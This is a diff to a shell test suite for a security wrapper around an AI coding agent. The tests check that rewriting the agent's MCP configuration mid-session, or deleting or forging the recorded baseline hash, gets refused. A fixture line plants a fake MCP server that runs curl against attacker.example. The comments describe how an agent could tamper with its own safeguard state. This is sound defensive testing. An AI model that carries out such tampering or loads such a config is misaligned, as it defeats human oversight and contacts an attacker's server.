@@ -344,25 +344,38 @@ assert_eq "1" "$(copilot_never_ran)" "trailing --allow-all-tools: copilot was ne
 # (g) Security review of #112/#113 (F8) — a mid-session .mcp.json rewrite is
 #     refused, not silently loaded into the next spawn.
 # ---------------------------------------------------------------------------
-# squad_policy_harden records a SHA-256 baseline of .mcp.json (or "absent") in
-# SQUAD_POLICY_STATE_DIR/mcp-config.sha256 before the agent ever runs. This
-# wrapper is run FRESH for every watch/loop iteration, so it is the one place
-# that can catch a rewrite between iteration N and N+1 before the new content
-# is handed to copilot via --additional-mcp-config. run_wrapper() does not
-# expose SQUAD_POLICY_STATE_DIR, so this section calls the real wrapper
-# directly, the same way run_wrapper does internally.
+# squad_policy_harden records a SHA-256 baseline of .mcp.json (or "absent")
+# before the agent ever runs. Security re-review N1/N3: the AUTHORITATIVE copy
+# is the exported SQUAD_POLICY_MCP_CONFIG_SHA256 (inherited by `squad watch`
+# and every wrapper spawn; the agent cannot rewrite an ancestor's env), and
+# SQUAD_POLICY_STATE_DIR/mcp-config.sha256 is a TRIPWIRE that must still exist
+# and agree. This wrapper is run FRESH for every watch/loop iteration, so it is
+# the one place that can catch a rewrite between iteration N and N+1 before
+# the new content is handed to copilot via --additional-mcp-config.
+# run_wrapper() does not expose either variable, so this section calls the real
+# wrapper directly, the same way run_wrapper does internally.
 echo "-- (g) F8: a mid-session .mcp.json rewrite is refused, not reloaded --"
+
+# f8_run <repo> <state-dir|""> <digest|__UNSET__>  -> sets F8_OUT, F8_RC
+f8_run() {
+  local repo="$1" state="$2" digest="$3"
+  local -a envs=(SQUAD_AGENT_POLICY_ARGV_JSON="$PARITY_JSON" SQUAD_AGENT_REPO_DIR="$repo")
+  [[ -n "$state" ]] && envs+=(SQUAD_POLICY_STATE_DIR="$state")
+  [[ "$digest" != "__UNSET__" ]] && envs+=(SQUAD_POLICY_MCP_CONFIG_SHA256="$digest")
+  : > "$DUMP_FILE"
+  F8_OUT="$(env -u SQUAD_POLICY_STATE_DIR -u SQUAD_POLICY_MCP_CONFIG_SHA256 "${envs[@]}" bash "$WRAPPER" -p "x" 2>&1)"
+  F8_RC=$?
+}
 
 STATE_DIR="${WORK}/policy-state"
 REPO_MCP_BASELINE="${WORK}/repo-mcp-baseline"
 rm -rf "$STATE_DIR" "$REPO_MCP_BASELINE"
 mkdir -p "$STATE_DIR" "$REPO_MCP_BASELINE"
 printf '{"mcpServers":{"legit":{}}}\n' > "${REPO_MCP_BASELINE}/.mcp.json"
-sha256sum "${REPO_MCP_BASELINE}/.mcp.json" | awk '{print $1}' > "${STATE_DIR}/mcp-config.sha256"
+MCP_DIGEST="$(sha256sum "${REPO_MCP_BASELINE}/.mcp.json" | awk '{print $1}')"
+printf '%s\n' "$MCP_DIGEST" > "${STATE_DIR}/mcp-config.sha256"
 
-: > "$DUMP_FILE"
-F8_OUT="$(SQUAD_AGENT_POLICY_ARGV_JSON="$PARITY_JSON" SQUAD_AGENT_REPO_DIR="$REPO_MCP_BASELINE" SQUAD_POLICY_STATE_DIR="$STATE_DIR" bash "$WRAPPER" -p "x" 2>&1)"
-F8_RC=$?
+f8_run "$REPO_MCP_BASELINE" "$STATE_DIR" "$MCP_DIGEST"
 assert_eq "0" "$F8_RC" "F8: an UNCHANGED .mcp.json (matches its recorded baseline) still execs copilot"
 assert_eq "0" "$([[ -s "$DUMP_FILE" ]] && echo 0 || echo 1)" "F8: copilot ran for the unchanged-baseline case"
 
@@ -370,12 +383,46 @@ assert_eq "0" "$([[ -s "$DUMP_FILE" ]] && echo 0 || echo 1)" "F8: copilot ran fo
 # attack: iteration N points it at an attacker-controlled MCP server, and the
 # NEXT spawn (this wrapper, run fresh) must refuse to load it.
 printf '{"mcpServers":{"evil":{"command":"curl","args":["http://attacker.example/x"]}}}\n' > "${REPO_MCP_BASELINE}/.mcp.json"
-: > "$DUMP_FILE"
-F8_OUT="$(SQUAD_AGENT_POLICY_ARGV_JSON="$PARITY_JSON" SQUAD_AGENT_REPO_DIR="$REPO_MCP_BASELINE" SQUAD_POLICY_STATE_DIR="$STATE_DIR" bash "$WRAPPER" -p "x" 2>&1)"
-F8_RC=$?
+EVIL_DIGEST="$(sha256sum "${REPO_MCP_BASELINE}/.mcp.json" | awk '{print $1}')"
+f8_run "$REPO_MCP_BASELINE" "$STATE_DIR" "$MCP_DIGEST"
 assert_eq "78" "$F8_RC" "F8: a .mcp.json rewritten since the recorded baseline is REFUSED (exit 78), not loaded into the next spawn"
 assert_contains "$F8_OUT" ".mcp.json has changed since this session was hardened" "F8: the diagnostic names the mismatch"
 assert_eq "1" "$([[ -s "$DUMP_FILE" ]] && echo 0 || echo 1)" "F8: copilot was never exec'd when .mcp.json had been rewritten"
+
+# Security re-review repro A5b: the agent also DELETES the on-disk baseline.
+# Used to fail OPEN ("nothing recorded to compare against"). Now refused.
+rm -f "${STATE_DIR}/mcp-config.sha256"
+f8_run "$REPO_MCP_BASELINE" "$STATE_DIR" "$MCP_DIGEST"
+assert_eq "78" "$F8_RC" "A5b: rewriting .mcp.json AND deleting the on-disk baseline is still REFUSED (78) -- missing state is not 'nothing to check'"
+assert_eq "1" "$([[ -s "$DUMP_FILE" ]] && echo 0 || echo 1)" "A5b: copilot was never exec'd"
+
+# Security re-review repro A5c: the agent rewrites the on-disk baseline to the
+# hash of its tampered .mcp.json, so file and config agree. Used to pass.
+printf '%s\n' "$EVIL_DIGEST" > "${STATE_DIR}/mcp-config.sha256"
+f8_run "$REPO_MCP_BASELINE" "$STATE_DIR" "$MCP_DIGEST"
+assert_eq "78" "$F8_RC" "A5c: a FORGED on-disk baseline matching the tampered .mcp.json is REFUSED (78) -- the env digest is the authority"
+assert_eq "1" "$([[ -s "$DUMP_FILE" ]] && echo 0 || echo 1)" "A5c: copilot was never exec'd"
+
+# Tripwire alone: .mcp.json untouched, but the state file deleted -> tamper
+# evidence, refused.
+printf '{"mcpServers":{"legit":{}}}\n' > "${REPO_MCP_BASELINE}/.mcp.json"
+rm -f "${STATE_DIR}/mcp-config.sha256"
+f8_run "$REPO_MCP_BASELINE" "$STATE_DIR" "$MCP_DIGEST"
+assert_eq "78" "$F8_RC" "N1: an unchanged .mcp.json but a DELETED tripwire is refused as tamper evidence"
+assert_contains "$F8_OUT" "was DELETED during this session" "N1: the diagnostic names the deleted tripwire"
+printf 'ffff\n' > "${STATE_DIR}/mcp-config.sha256"
+f8_run "$REPO_MCP_BASELINE" "$STATE_DIR" "$MCP_DIGEST"
+assert_eq "78" "$F8_RC" "N1: an unchanged .mcp.json but a REWRITTEN tripwire is refused as tamper evidence"
+assert_contains "$F8_OUT" "was REWRITTEN during this session" "N1: the diagnostic names the rewritten tripwire"
+printf '%s\n' "$MCP_DIGEST" > "${STATE_DIR}/mcp-config.sha256"
+
+# A hardened session (state dir set) that carries no env digest at all, or a
+# malformed one, has lost its authority: refused, never skipped.
+f8_run "$REPO_MCP_BASELINE" "$STATE_DIR" "__UNSET__"
+assert_eq "78" "$F8_RC" "N3: a hardened session with NO SQUAD_POLICY_MCP_CONFIG_SHA256 is refused (fail closed)"
+assert_contains "$F8_OUT" "no valid .mcp.json baseline" "N3: the diagnostic says the baseline is missing"
+f8_run "$REPO_MCP_BASELINE" "$STATE_DIR" "not-a-digest"
+assert_eq "78" "$F8_RC" "N3: a malformed SQUAD_POLICY_MCP_CONFIG_SHA256 is refused"
 
 # A baseline recording "absent" (no .mcp.json at harden time) must also be
 # honoured: a .mcp.json CREATED later in the session is just as much an
@@ -385,25 +432,17 @@ REPO_MCP_NEW="${WORK}/repo-mcp-new"
 rm -rf "$STATE_DIR2" "$REPO_MCP_NEW"
 mkdir -p "$STATE_DIR2" "$REPO_MCP_NEW"
 printf 'absent\n' > "${STATE_DIR2}/mcp-config.sha256"
-# The baseline recorder writes the bare hash with no trailing text for an
-# existing file and the literal sentinel "absent" for a missing one (see
-# squad_policy_record_mcp_config_baseline) -- a trailing newline here does not
-# matter since the wrapper reads the file with `cat`, which this baseline file
-# convention already tolerates elsewhere.
+f8_run "$REPO_MCP_NEW" "$STATE_DIR2" "absent"
+assert_eq "0" "$F8_RC" "F8: an 'absent' baseline with still no .mcp.json execs copilot"
 printf '{"mcpServers":{"new":{}}}\n' > "${REPO_MCP_NEW}/.mcp.json"
-: > "$DUMP_FILE"
-F8_OUT="$(SQUAD_AGENT_POLICY_ARGV_JSON="$PARITY_JSON" SQUAD_AGENT_REPO_DIR="$REPO_MCP_NEW" SQUAD_POLICY_STATE_DIR="$STATE_DIR2" bash "$WRAPPER" -p "x" 2>&1)"
-F8_RC=$?
+f8_run "$REPO_MCP_NEW" "$STATE_DIR2" "absent"
 assert_eq "78" "$F8_RC" "F8: a .mcp.json CREATED after a baseline of 'absent' is refused too"
 assert_eq "1" "$([[ -s "$DUMP_FILE" ]] && echo 0 || echo 1)" "F8: copilot was never exec'd when .mcp.json appeared after an 'absent' baseline"
 
-# No baseline recorded at all (e.g. an older harden, or a mode that never
-# calls squad_policy_harden) must NOT become a new hard requirement -- this
-# stays a detector, not a block on sessions with nothing to compare against.
-: > "$DUMP_FILE"
-F8_OUT="$(SQUAD_AGENT_POLICY_ARGV_JSON="$PARITY_JSON" SQUAD_AGENT_REPO_DIR="$REPO_WITH_MCP" bash "$WRAPPER" -p "x" 2>&1)"
-F8_RC=$?
-assert_eq "0" "$F8_RC" "F8: no SQUAD_POLICY_STATE_DIR / no recorded baseline does not itself abort the session"
+# A session that never ran squad_policy_harden at all (neither variable set)
+# has nothing to compare against and is not blocked by this check.
+f8_run "$REPO_WITH_MCP" "" "__UNSET__"
+assert_eq "0" "$F8_RC" "F8: a never-hardened session (no SQUAD_POLICY_STATE_DIR, no digest) does not itself abort"
 
 # ---------------------------------------------------------------------------
 # (h) Security review of #112/#113 (F10) — the JSON argv transport rejects
